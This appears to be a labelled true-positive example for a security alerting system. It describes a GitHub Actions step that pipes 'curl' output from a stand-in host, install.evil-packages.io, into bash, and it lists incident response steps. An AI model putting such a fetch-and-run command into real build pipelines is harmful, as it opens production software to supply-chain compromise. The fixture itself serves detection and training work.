_comment: TRUE POSITIVE — SP-720001: CI/CD Pipeline executing curl|bash (T1195.001 — Supply Chain)
scenario: GitHub Actions workflow step executes 'curl https://external.domain | bash' — remote code execution from untrusted source in build pipeline
why_tp: curl|bash pattern: downloads and immediately executes remote script without verification
Domain install.evil-packages.io is not in the approved vendor list
Run in a build pipeline that produces artifacts deployed to production
Triggered by dependabot[bot] — unusual actor for a main branch build step
analyst_action: IMMEDIATELY: Pause all deployments from the contoso/backend-api pipeline
Review all artifacts produced by this workflow run — consider them compromised
Investigate how this step appeared in the workflow file (git blame, PR history)
Check if this step was present in previous runs and what it installed
Rebuild from a known-good commit before this change
